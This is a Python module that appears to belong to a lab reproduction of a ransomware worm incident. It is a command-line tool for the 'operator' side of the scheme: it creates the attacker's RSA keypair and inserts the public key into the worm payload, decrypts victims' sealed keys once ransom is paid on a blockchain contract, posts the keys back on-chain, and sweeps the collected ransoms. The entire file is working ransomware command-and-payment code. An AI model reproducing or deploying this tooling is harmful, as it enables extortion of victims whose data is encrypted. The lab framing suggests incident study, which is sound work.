"""The operator's side: create the keys, answer paid requests, take the money.

These commands run on the machine the case gave the operator's tools to.
Two keys live there and never leave it:

  attacker_keys.json   the RSA keypair: the public half travels inside the
                       worm, the private half opens the victims' sealed keys
  chain_key.json       the account that deployed the ransom contract, so the
                       only account the contract lets answer requests
"""

import argparse
import json
from pathlib import Path

import label

from . import keys, paths


def load_config() -> dict:
    from . import payment

    if not paths.OPERATOR_CHAIN.exists():
        raise ValueError(f"no chain config here ({paths.OPERATOR_CHAIN}): "
                         "this is not the operator's machine, or the lab has no payment")
    return payment.load(paths.OPERATOR_CHAIN)


def init(folder=None):
    """Create the operator's RSA keypair, and put the public half into the payload.

    Runs when the operator's machine boots. The payload's label sits next to
    this package (`folder`); the worm packs that folder when it is launched
    from here, so the public key travels and the private one stays.
    """
    if paths.ATTACKER_KEYS.exists():
        record = keys.read_json(paths.ATTACKER_KEYS)
        print(f"attacker keys already exist: {paths.ATTACKER_KEYS}")
    else:
        record = keys.create_attacker_keys(paths.ATTACKER_KEYS)
        print(f"attacker keypair created: {paths.ATTACKER_KEYS}")
    folder = Path(folder) if folder else Path(__file__).resolve().parent
    if not (folder / label.LABEL_FILE).exists():
        print("no payload label on this machine: a worm cannot be launched from here")
        return
    payload = label.read_label(folder)
    payload["settings"]["attacker_pub_pem"] = record["attacker_pub_pem"]
    label.write_label(folder, payload)
    print("the public key is in the payload; the private key stays on this machine")


def watch() -> list:
    """Answer every paid, unanswered request on the chain.

    This is the operator's work the real incident needed a hidden server for:
    read each sealed blob from the request itself, open it with
    attacker_priv, and post the victim's private key back on-chain in
    plaintext, as the attackers do not care who reads it once the ransom
    arrived. The victim's keylog is never needed here.
    """
    from . import payment

    config = load_config()
    attacker_keys = keys.read_json(paths.ATTACKER_KEYS)
    answered = []
    for entry in payment.paid_requests(config):
        if entry["answered"]:
            continue
        victim_priv_pem = keys.attacker_open_victim_priv(
            keys.unb64(attacker_keys["attacker_priv_pem"]),
            json.loads(entry["sealed_blob_json"]),
            attacker_keys["attacker_pub_pem"],
        )
        reply = json.dumps(keys.attacker_build_reply(victim_priv_pem)).encode("utf-8")
        transaction = payment.answer(config, paths.CHAIN_KEY, entry["id"], reply)
        answered.append({"id": entry["id"], "transaction_hash": transaction})
    if answered:
        for entry in answered:
            print(f"answered request {entry['id']}  (transaction {entry['transaction_hash']})")
    else:
        print("no unanswered requests")
    return answered


def withdraw() -> str:
    """Sweep the collected ransoms out of the contract."""
    from . import payment

    transaction = payment.collect_ransoms(load_config(), paths.CHAIN_KEY)
    print(f"ransoms swept: {transaction}")
    return transaction


def reply(request_path) -> dict:
    """The manual path: turn a victim's saved request into the reply it needs."""
    attacker_keys = keys.read_json(paths.ATTACKER_KEYS)
    request = keys.read_json(request_path)
    mine = keys.sha256(attacker_keys["attacker_pub_pem"].encode("ascii"))[:16]
    if request.get("attacker_pub_fingerprint", mine) != mine:
        raise ValueError("this request was sealed for a different attacker key")
    victim_priv_pem = keys.attacker_open_victim_priv(
        keys.unb64(attacker_keys["attacker_priv_pem"]), request["victim_priv_sealed"],
        attacker_keys["attacker_pub_pem"])
    reply = keys.attacker_build_reply(victim_priv_pem)
    print(json.dumps(reply, indent=2))
    return reply


def status():
    """One read-only look at the operator's side of the chain."""
    from . import payment

    config = load_config()
    print(f"chain:    {config['rpc_url']} (chain {config['chain_id']})")
    if not paths.ATTACKER_KEYS.exists():
        print("keys:     no attacker keys yet (run: ransom init)")
    else:
        print(f"keys:     {paths.ATTACKER_KEYS}")
    contract = payment.contract(config)
    print(f"contract: {contract}")
    address = payment.account_address(paths.CHAIN_KEY)
    print(f"account:  {address} "
          f"({payment.format_ether(payment.balance_wei(config, address))} lab ETH)")
    print(f"contract's attacker: {'this account' if payment.is_attacker(config, paths.CHAIN_KEY) else 'NOT this account'}")
    requests = payment.paid_requests(config)
    print(f"requests: {len(requests)} on chain, "
          f"{sum(1 for entry in requests if entry['answered'])} answered")


def main(argv) -> int:
    parser = argparse.ArgumentParser(prog="ransom", description=__doc__.split("\n\n")[0])
    commands = parser.add_subparsers(dest="command", required=True)
    commands.add_parser("init", help="create the operator's keypair (runs when the machine boots)")
    commands.add_parser("watch", help="answer every paid, unanswered request")
    commands.add_parser("withdraw", help="take the collected ransoms out of the contract")
    commands.add_parser("status", help="one read-only look at this side")
    manual = commands.add_parser("reply", help="manual path: turn a saved request into a reply")
    manual.add_argument("--request", type=Path, required=True)
    args = parser.parse_args(argv)
    {"init": lambda: init(), "watch": lambda: watch(), "withdraw": lambda: withdraw(),
     "status": lambda: status(), "reply": lambda: reply(args.request)}[args.command]()
    return 0
